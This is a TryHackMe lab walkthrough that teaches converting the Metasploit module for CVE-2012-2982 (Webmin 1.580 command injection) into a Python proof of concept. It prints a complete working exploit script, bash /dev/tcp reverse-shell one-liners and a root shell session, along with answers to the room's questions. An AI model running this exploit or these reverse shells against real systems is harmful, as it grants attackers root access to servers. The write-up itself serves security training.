# Intro PoC Scripting

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from 
many different sources.
```

Room link: [https://tryhackme.com/room/intropocscripting](https://tryhackme.com/room/intropocscripting)

## Solution

### Task 1 - Introduction - What are PoC scripts?

Greetings!

This room is an introduction to a fundamental skill of most cybersecurity domains; *exploit development* by **crafting exploit scripts from proof of concept code**. This room intends to introduce beginner skills and concepts that can be adapted to many different types of exploits.The prerequisite skills I'd recommend for this room are basic programming and penetration testing experience.

**proof of concept** (PoC): evidence, typically derived from an experiment or pilot project, which demonstrates that a design concept, business proposal, etc., is feasible.

The term exploit development is sometimes strictly referred to writing programs that leverage buffer overflow attacks or reverse engineer binary files, here it's being used more broadly as taking the contents of a CVE and PoC code to incite unintended behavior of the target system and gain privileged access.

#### Why learn to write PoC scripts and exploit development?

When many students are first introduced to penetration testing and hacking in general, they tend to want to use the easiest route, aka, automating tasks with metasploit. While metasploit is a convenient tool and has a wide range of applications, it takes the focus away from what we are actually exploiting and **why** something is vulnerable. Being able to examine proof of concept code and craft custom payloads will not only improve exploit development skills, but also skills in the language used to develop them. Ultimately, understanding the intimate and complex details of why something is vulnerable is an essential skill for all facets of information security.

For those studying for practical certifications, we're expected to adapt proof of concept code from various sources that does not do what we want immediately, but provides a path to a vulnerable spot in the target system and a method for exploiting. No matter the type of exploit it's expected that we're able to look at the source code (e.g ruby code of metasploit module or bug trackers), identify the exact exploitable endpoint, what parameters get sent, and write a small script that sends the appropriate parameters to that endpoint with a custom payload. Not every vulnerability that exists will have a pre-made exploit script to use but, if you learn and practice how to make them yourself, you'll acquire a deeper understanding of cybersecurity topics and accumulate more technical skills.

#### Methodologies

As this room uses one isolated example, we cannot apply the knowledge used here to every script we write. However, as you practice this concept more, you will begin to notice patterns and generalities that can be applied more broadly. A handful of common methodologies I've found thus far include:

- **Optimize the script and condense unnecessary code**: keep it simple stupid
- **Read and reread PoC code before researching**: assists in identifying errors in scripts and how to fix them, sometimes before they occur
- **Research as detailed as possible**: not all essential information is found on documentation and stackoverflow
- **Prepare to adapt and customize**: PoC code sometimes uses pre-made libraries with specific functions you'll need to personally craft
- **Test segments of code along the way**: this makes it easier to pinpoint potential issues

### Task 2 - Example - The starting point

In terms of CTFs, vulnerability scanning, penetration testing, and across an extensive array of security fields, writing PoC scripts can be used to assist or completely accomplish one's task a majority of the time. As a result of this, it is one of the most flexible skills to possess and master over time. It is easier to practice with intentionally vulnerable boxes that have known CVE details and documentation as a beginner.

The first encounter I had on tryhackme where I wanted to avoid metasploit to learn manual exploitation, I could not find a relevant public exploit to suit my needs. To escalate local privileges I had to either use metasploit or analyze the metasploit module's ruby source code and make a custom PoC script. This vulnerability was discovered over eight years ago, but it's a very appropriate beginner example to expose the requirements of learning exploit development.

Credentials

- username: user1
- password: 1user

In this room we'll be using python to craft our script, but any scripting language would be suitable. For the sake of focusing on development, we'll be skipping enumeration and simulate a situation where we have low-level user access. Enter the IP address into a browser, visit the website, and enter the above credentials. With our local access we can clearly see the **platform** and **version number**.

![Webmin Identification](Images/Webmin_Identification.png)

We can use a native Kali tool searchsploit to inspect the platform and version number, it parses the exploit-db website for known exploits.

`searchsploit webmin 1.580`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ searchsploit webmin 1.580
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                               | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                       | linux/webapps/47330.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is .rb code for our exact target, lets inspect the contents with `cat /usr/share/exploitdb/exploits/unix/remote/21851.rb`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ searchsploit -m 21851        
  Exploit: Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/21851
     Path: /usr/share/exploitdb/exploits/unix/remote/21851.rb
    Codes: CVE-2012-2982, OSVDB-85248
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting/21851.rb

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ head -n 30 21851.rb
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = ExcellentRanking

        include Msf::Exploit::Remote::HttpClient

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Webmin /file/show.cgi Remote Command Execution',
                        'Description'    => %q{
                                        This module exploits an arbitrary command execution vulnerability in Webmin
                                1.580. The vulnerability exists in the /file/show.cgi component and allows an
                                authenticated user, with access to the File Manager Module, to execute arbitrary
                                commands with root privileges. The module has been tested successfully with Webim
                                1.580 over Ubuntu 10.04.
                        },
                        'Author'         => [
                                'Unknown', # From American Information Security Group
                                'juan vazquez' # Metasploit module
                        ],
                        'License'        => MSF_LICENSE,
                        'References'     =>
```

We'll be using metasploit's code repository as a starting point, [this module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb) to be exact. The module exploits an arbitrary command execution vulnerability in Webmin 1.580, [CVE-2012-2982](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2982). The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to **execute arbitrary commands with root privileges**.

#### What does this mean?

On the surface level, we know that we can execute any program we want on this Ubuntu server. In most scenarios it makes sense to execute the **system shell**, especially when we have root or administrator privileges. It enables us to have complete control over the target system and manipulate it to our needs. Let's take a more detailed look at the CVE description and explain exactly what it means.

CVE description: `file/show.cgi` in **Webmin 1.590** and earlier allows **remote authenticated users** to **execute arbitrary commands** via an **invalid character** in a **pathname**, as demonstrated by a `|` (pipe) character.

This means that an input invalidation flaw within the binary file of show.cgi, exploited using a | (pipe) character, allows for remote authenticated attackers to execute any command as a privileged user. Meaning all we need to do is input invalid characters and pipe those to a system command (system shell). We can **execute the payload, open a socket connection and send it back to the attacker** listening with `netcat`.

#### Understanding the vulnerability

CVE documentation provides resources that can better highlight and demonstrate the source of vulnerabilities. In open source software, developers keep public track of bugs their platforms and systems produce, usually on github. For this particular exploit, the before and after of the bug that led to CVE-2012-2982 is [documented on github](https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213), the vulnerability and how it was fixed.

![Webmin Vulnerability Fix 1](Images/Webmin_Vulnerability_Fix_1.png)

Here we can see a section of `/file/show.cgi` as it exists in Webmin versions 1.590 and earlier. The highlighted red text indicates the vulnerability while the green indicates the patch. The `<` operator was introduced to sanitize input of invalid characters, as demonstrated by *view_epathinfo*. As we know from the description, this input invalidation enables us to open any file we want.

![Webmin Vulnerability Fix 2](Images/Webmin_Vulnerability_Fix_2.png)

This is a very small but vital piece of information to know before analyzing the metasploit module, it gives us a clear picture of what we are taking advantage of and what to strive towards while analyzing the code.

As of the time of this room's creation, I could not find a public exploit script for CVE-2012-2982, leaving us the only option to make one for ourselves.

----------------------------------------------------------------------

#### What is the target's platform and version number?

Answer: Webmin 1.580

#### What is the associated CVE for this platform?

Answer: CVE-2012-2982

#### Which file does the vulnerability exist in?

Hint: file/show.cgi

Answer: file/show.cgi

#### What program/command would be the most effective to use in this exploit?

Hint: system shell

Answer: system shell

### Task 3 - Translating Metasploit module code

Let's begin with analyzing the [ruby source code](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb) of the metasploit module. The source code can be broken up into three main functions; **initialize**, **check** and **exploit**. It would be most beneficial to inspect them separately.

#### Initialize

```ruby
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin /file/show.cgi Remote Command Execution',
      'Description'    => %q{
          This module exploits an arbitrary command execution vulnerability in Webmin
        1.580. The vulnerability exists in the /file/show.cgi component and allows an
        authenticated user, with access to the File Manager Module, to execute arbitrary
        commands with root privileges. The module has been tested successfully with Webmin
        1.580 over Ubuntu 10.04.
      },
      'Author'         => [
        'Unknown', # From American Information Security Group
        'juan vazquez' # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '85248'],
          ['BID', '55446'],
          ['CVE', '2012-2982'],
          ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf'],
          ['URL', 'https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl ruby python telnet',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Webmin 1.580', { }]],
      'DisclosureDate' => '2012-09-06',
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(10000),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('USERNAME',  [true, 'Webmin Username']),
          OptString.new('PASSWORD',  [true, 'Webmin Password'])
        ])
  end
```

There is little technicality in this function, but the purpose is to initialize the program with essentials. It begins with a description of the exploit, authors and reference sites of the shellcode and associated CVE. This conversion is mostly unessential and can be skipped.

There are a few simple parameters to take note of the `update_info` function that we might need to consider converting

- `Space = 512` - maximum space in memory to store the payload
- `PayloadType = cmd` - ensures that the payload the exploit uses is the `cmd`

And the `register_options` function

- `RPORT(10000)` - sets the target port
- `'SSL', [true, 'Use SSL', true]` - whether or not the site uses HTTPS (this didnt so set to false)
- `'USERNAME', [true, 'Webmin Username']` - accepts the username
- `'PASSWORD', [true, 'Webmin Password']` - accepts the password

Information to convert

- **payload type**: cmd or the system shell
- placeholder for the **username and password**
- **RPORT**: the website is on the default HTTP port 80 instead of 10000

Other information such as memory allocation is done automatically when using python so we can ignore this. The website does not use TLS so we'll have to note this in the POST request.

#### Check

```ruby
  def check

    peer = "#{rhost}:#{rport}"

    vprint_status("Attempting to login...")

    data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => "/session_login.cgi",
        'cookie'  => "testing=1",
        'data'    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /sid/
      vprint_good "Authentication successful"
      session = res.get_cookies.split("sid=")[1].split(";")[0]
    else
      vprint_error "Service found, but authentication failed"
      return Exploit::CheckCode::Detected
    end

    vprint_status("Attempting to execute...")

    command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"

    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
        'cookie'  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end

  end
```

The purpose of this function is to verify that the target is vulnerable to CVE-2012-2982. As this function only exists to verify the vulnerability, it is expendable in our custom script. Let's breakdown this function line by line (I'll be skipping the print statements)

- `peer = "#{rhost}:#{rport}"` - reserves space for the target IP and port
- `data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"` - stores the URL that handles the login request
- `res = send_request_cgi({'method' => 'POST', 'uri' => "/session_login.cgi", 'cookie' => "testing=1", 'data' => data}, 25)` - sends an HTTP POST request to login with compromised credentials

The beginning portion of this function establishes the flow of the rest of the script

1. sets target IP and port
2. obtains Webmin login page URI
3. sends a POST request to the server

Here we simply have elements of a POST request, the login page, test cookie, and credentials. We know we need **authenticated** credentials in order to use this exploit, the POST request logs us in and assigns us a unique cookie to verify our local access privileges on the target and communicate as if we had a graphical interface. In fact, we can use the developer tools in our browser to verify the information.

![Webmin Check Network Traffic](Images/Webmin_Check_Network_Traffic.png)

We can verify the contents of the POST request, the login data `page=%2F&user=user1&pass=1user` (%2F is an equivalent of forward slash /) and the HTTP response headers.

The next section of the check function can be intimidating to beginners, but it's more simple than it appears. All this section does is format the unique cookie to exclude unnecessary text and generate a random string.

- `if res and res.code == 302 and res.get_cookies =~ /sid/` - if statement to continue if the HTTP response code is 302 and if the cookie equals the value of sid, session ID
- `session = res.get_cookies.split("sid=")[1].split(";")[0]` - formats the cookie into a readable string based on the Set-Cookie header in the HTTP response
- `command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"` - generates a random string of 5 alphanumeric characters to use as invalid input

This part has some important duties within the script. We verify that

1. the first POST request responds with a 302 (found) status code
2. the cookies are labeled as sid
3. format the cookies for excess text
4. generate the invalid input to pipe into the malicious command

The most important information in this section is the format of the unique cookie and generating a random alphanumeric string.

The cookie is formatted by reading the output of the [Set-Cookie](https://www.geeksforgeeks.org/http-headers-set-cookie/) header. The actual cookie is a random alphanumeric string but there is other information (the name and path) that is apart of the header, this line of code simply gets rid of the excess information and stores the alphanumeric value. From the developer tools, we see the name sid proceeds the actual value, so the method [split](https://www.geeksforgeeks.org/ruby-string-split-method-with-examples/) is used to [split](https://spin.atomicobject.com/2007/11/01/ruby-string-split/) the text at "sid=" and returns an array, storing the alphanumeric value and the remaining text. It's then repeated to split at ";" and return an array with no elements, leaving only the alphanumeric cookie value.

The command variable uses echo to print five random [alphanumeric characters](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf%2FExploit:rand_text_alphanumeric) to be used as invalid input to pipe to the malicious command, generating a random alphanumeric string.

Information to convert

- **the login page URI data** (credentials and login page file)
- **POST request** sending the URI data
- format the cookie
- **HTTP response code** and the **session id** is not empty
- generate **five random characters**

The second request simply checks if the target is vulnerable to the exploit, we'll discuss this in more detail below.

#### Exploit

```ruby
  def exploit

    peer = "#{rhost}:#{rport}"

    print_status("Attempting to login...")

    data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => "/session_login.cgi",
        'cookie'  => "testing=1",
        'data'    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /sid/
      session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
      if session and not session.empty?
        print_good "Authentication successful"
      else
        print_error "Authentication failed"
        return
      end
      print_good "Authentication successful"
    else
      print_error "Authentication failed"
      return
    end

    print_status("Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
        'cookie'  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      print_good "Payload executed successfully"
    else
      print_error "Error executing the payload"
      return
    end

  end
```

You may have noticed some similarities between the check and exploit functions, they are identical aside from the fact that the exploit function sends the actual payload. The initial POST request, formatting cookies and second request to send the payload are identical to the check function. This makes this script easier for us as we can condense redundant code.

The main difference in this exploit is the change of the *command* variable. We can see with `payload.encoded` that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require URL encoding. Here metasploit is using it as insurance because as we'll see in the next task, in this scenario it doesn't need to be encoded **manually** because the payload does not break in transit.

Lets discuss the second request. The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability show.cgi and enters the invalid input, piping it with | to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we'll have include a line to open a socket on the victim in order to send the system shell back to us.

Information to convert

- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command

At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.

#### Information to convert

- payload type: cmd or system shell
- the login page URI data (credentials, receiving port and login page file)
- POST request sending the URI data
- format the cookie
- verify HTTP response code and the session id is not empty, print statement to verify success
- generate five random characters
- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command

At first this module may have seemed intimidating, but as we've broken down in this task it's rather simple. All it's really doing is sending a couple POST requests. While some penetration testers may want to first verify the target is vulnerable to a particular exploit, it's not always necessary if the goal is a simple and quick privilege escalation such as this example. You may sometimes find among proof of concept code that it contains unnecessary weight to what could be a simple, quick script.

----------------------------------------------------------------------

#### What's the original disclosure date of this exploit?

```ruby
<---snip--->
      'Targets'        => [[ 'Webmin 1.580', { }]],
      'DisclosureDate' => '2012-09-06',
      'DefaultTarget'  => 0))
<---snip--->
```

Answer: September 6 2012

#### What HTTP response code do we expect after the initial POST request?

```ruby
<---snip--->
    if res and res.code == 302 and res.get_cookies =~ /sid/
      vprint_good "Authentication successful"
      session = res.get_cookies.split("sid=")[1].split(";")[0]
<---snip--->
```

Answer: 302

#### What does sid stand for and what is it's purpose?

Hint: Session ID, authentication

Answer: Session ID, authentication

#### In the check function, what is it doing to the cookies?

Hint: Remember, the full Set-Cookie header contains more than the "actual" cookie

Answer: format

#### In the second request of the check function, what method is piped into the command?

```ruby
<---snip--->
    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
        'cookie'  => "sid=#{session}"
      }, 25)
<---snip--->
```

Answer: rand_text_alphanumeric

### Task 4 - Converting Ruby to Python

This exploit PoC is written in Python, but you can use your preferred language as an additional challenge. For the most part, the syntax will be relatively the same format with the POST requests, cookie formatting, and if statement. The main differences in syntax will be the random character and payload functions.

Lets review exactly what we need to convert again.

- payload type: cmd or system shell
- the login page URI data (credentials, receiving port and login page file)
- POST request sending the URI data
- format the cookie
- verify HTTP response code and the session id is not empty, print statement to verify success
- generate five random alphanumeric characters
- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command

Similar to the metasploit module, we can dissect our exploit into three main parts; **initialize payload**, **login**, **exploit**.

#### Initialize Payload

The most important task here is to enable python to execute the system shell `/bin/sh` or `/bin/bash`. Python has numerous ways to execute system programs natively but remember, we have the ability of **arbitrary command execution**, meaning that we can use whatever command (not just python code) necessary to establish a reverse shell including with Python, Bash, Ruby, netcat, PHP, socat and a plethora of other commands available to us.

We can examine different examples and methods applicable to our script. You can view reverse shell examples in python and other languages/commands in the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) repository as well as [gtfobins](https://gtfobins.github.io/#+reverse%20shell) and [One-Lin3r](https://github.com/D4Vinci/One-Lin3r). I encourage you to experiment with the final script and test different reverse shells to see what does and doesn't work.

As discussed in more detail below, the simplest way to open a connection to the attacker and send the shell will be to run a `bash` command executing a reverse shell.

Our initialization will be `payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

- payload type: cmd or system shell - **DONE**!

#### Login

In some cases, especially when researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command like the author of the metasploit module included. For the purposes of this room because we already confirmed the CVE, we can condense the steps to login once, return if 302 status code and return the sid cookie to use in the payload POST request. The request should be fairly simple and we can go down our list item by item, using the `requests` library

- the login page URI data (credentials, receiving port and login page file)
- POST request sending the URI data
- format the cookie
- verify HTTP response code and the session id is not empty, print statement to verify success

POST requests in python can send data to a server via a dictionary, list of tuples, bytes or a file object. We only need three items to send as data, the page, username, and password. From the developer tools we know the exact labels of each of these; page, user, and pass.

`data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}`

We can include a variable with the file to target using [f-strings](https://www.geeksforgeeks.org/formatted-string-literals-f-strings-python/). We know the receiving port is the default port 80 so we don't need to include it manually.

`url = f"http://{targetIP}/session_login.cgi"`

Now we have all of the information we need to login via POST request. We'll be sending the credentials, the test cookie with its value, as well as ignoring TLS and site redirects.

`r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)`

Next we can include the if statement. We can check the status code and verify the cookies aren't empty using methods from the `requests` module.

`if r.status_code == 302 and r.cookies["sid"] != None`

In the metasploit module, the manual formatting of cookies with `.split()` is necessary but this is not the case in python. While we are able to include several methods to obtain the alphanumeric cookie, we can simply read the value from the header directly with `r.cookies["sid"]`. We can assemble a quick test and see each method of formatting the cookie works.

```python
#!/usr/bin/env python

import requests

targetIP = "10.10.41.222"

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
    print("[+] Login successful, executing payload")
else:
    print("[-] Failed to login")
    
c = r.cookies["sid"]
s = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
si = r.headers['Set-Cookie'].split('=')[1].split(";")[0].strip()
sid = c.strip("/=; ")

print(c)
print(s)
print(si)
print(sid)
```

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ ./login_check.py 
[+] Login successful, executing payload
6707160bfd7e0073b2c9dcc7f9b42bed
6707160bfd7e0073b2c9dcc7f9b42bed
6707160bfd7e0073b2c9dcc7f9b42bed
6707160bfd7e0073b2c9dcc7f9b42bed
```

We've now completed the login section of our exploit.

- the login page URI data (credentials, receiving port and login page file) - **DONE**!
- POST request sending the URI data - **DONE**!
- format the cookie - **DONE**!
- verify HTTP response code and the session id is not empty, print statement to verify success - **DONE**!

#### Exploit

Now we've reached the main event, crafting our exploit. Let's review our needs and discuss some initial ideas to implement them.

- generate five random alphanumeric characters
- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command

The exploit section of our code will also be straightforward. We will write functions to generate five random alphanumeric characters stored in a string and a payload which opens the shell via `bash` and captures the output to send via a GET or POST request.

The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL. This saves space and makes the program clearer by directly piping the invalid character to the payload. In order to do this, we'll have to analyze the type of data we're dealing with. For data to be used in conjunction, it must be of the same type. Our random character and payload functions must both be strings to be formatted in the URL.

`exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"`

Using the `string` and `secrets` modules we're able to make a function that randomly prints five alphanumeric character. The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.

`alphaNum = string.ascii_letters + string.digits`

We can then input this variable to be randomly generated with five characters `randChar = ''.join(secrets.choice(alphaNum) for i in range(5))`

```python
#!/usr/bin/env python

import string, secrets

def rand_secret():
    alphaNum = string.ascii_letters + string.digits
    randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
    return randChar

for i in range(1, 20):
    print(rand_secret())
```

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ ./random_secret.py 
qYH7b
GccAH
rTgEV
ZmAbf
2LKPl
N21R9
lHJp7
ROQYX
SjTEH
5tWLY
BsEM4
c76Z6
3eOwD
KiwU2
OZx6t
jIMd3
CJrmd
qgJl4
XZDxd
```

#### payload()

There are numerous ways to execute the system shell on Linux as we have the freedom to **execute any command** that we want. In this scenario we will save steps and space by using bash to open a connection to the attacker and send the shell. [PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp) lists the following examples:

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

The first command listed `bash -i` is a popular one line command to establish an interactive reverse shell on a system. This will be the basis for our payload() function but it does require some tweaks. While it executes a reverse shell, we are missing a key point. Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash. To fix this, we can use `bash -c 'exec bash -i xyz'`

[exec](https://www.computerhope.com/unix/bash/exec.htm) completely replaces the current running process. The current shell process is destroyed and entirely replaced by the command we specify which will be the reverse shell `bash -i &>/dev/tcp/TARGET_IP/PORT`

I also want to discuss the meaning of `<&1`, `0>&1`, or `0<&1` which are interchangeable, [this article](https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean) discusses the specific command in detail. I recommend reading [this article](https://stackoverflow.com/questions/24793069/what-does-do-in-bash) and [this article](https://unix.stackexchange.com/questions/120532/what-does-exec-31-do) if the syntax is brand new to you. The purpose of `<&1` is to redirect the output stream (1, stdout) of the TCP socket to the input stream (0, stdin) of the bash shell and create a reverse shell. Bash opens a TCP socket on the target machine through the given port and makes a request to the given IP (the attacker). The output stream of the socket is then redirected to the input steam of the new bash shell, sending the shell process through the socket. The ampersand character `&` acts as a reference to the I/O socket streams.

`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

Lastly, all we need is the second request with the authenticated cookie. The module did not specify whether to use a POST or GET method however, in this scenario either method works.

`req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`

- generate five random alphanumeric characters - **DONE**!
- store the system shell with a function, encode it and send it back via socket - **DONE**!
- send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command - **DONE**!

----------------------------------------------------------------------

#### Which HTTP response header allows us to send an authenticated POST request?

Answer: Set-Cookie

#### Which is the correct method for formatting cookies in this example?

Hint: any

r.headers().replace().split().strip()

r.headers().split().strip()

a = r.cookies()
b = a.strip()

Answer: any

#### What data type does the payload need to be?

Answer: string

#### Why do we need to use "bash -c exec" instead of just "bash -i"

Hint: replaces current shell process

Answer: replaces current shell process

#### What is the purpose of "<&1" in the payload function?

Hint: redirects socket output stream to bash input stream

Answer: redirects socket output stream to bash input stream

### Task 5 - Final exploit and test

We're ready to test the final script, run the following commands:

`wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py`

Change the attacker IP and listen for the shell with `nc -nlvp 53`

`python3 web.py <targetIP>` if you receive errors about missing libraries, install them with `pip`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py
--2025-05-17 16:23:13--  https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 945 [text/plain]
Saving to: ‘web.py’

web.py                                            100%[===========================================================================================================>]     945  --.-KB/s    in 0s      

2025-05-17 16:23:14 (7.65 MB/s) - ‘web.py’ saved [945/945]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ vi web.py  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ cat web.py       
#!/usr/bin/env python

#usage: python3 web.py <targetIP>
import sys, requests, string, secrets

targetIP = sys.argv[1]
lhost = "10.14.61.233" #attacker IP
lport = "12345" #listening port

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
        print("[+] Login successful, executing payload")
else:
        print("[-] Failed to login")

sid = r.cookies["sid"]

def rand():
        alphaNum = string.ascii_letters + string.digits
        randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
        return randChar

def payload():
        payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
        return payload

exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ python3 web.py 10.10.41.222
[+] Login successful, executing payload

```

----------------------------------------------------------------------

#### Run the program and listen for the shell. What is the /root/root.txt flag?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Intro_PoC_Scripting]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.41.222] 53136
bash: cannot set terminal process group (1118): Inappropriate ioctl for device
bash: no job control in this shell
root@dummybox:/usr/share/webmin/file/# hostname
hostname
dummybox
root@dummybox:/usr/share/webmin/file/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dummybox:/usr/share/webmin/file/# cat /root/root.txt
cat /root/root.txt
THM{<REDACTED>}
root@dummybox:/usr/share/webmin/file/# 
```

Answer: `THM{<REDACTED>}`

### Task 6 -  Common Mistakes

When writing exploits, the goal is not to use complex code or use more than is necessary for the task. While you do want clean and concise code, sometimes PoC scripts are crafted in specific ways, maybe the author had your original thought process and found an easier solution. Maybe something required in the original language is not necessary in the language you're using and vice versa.

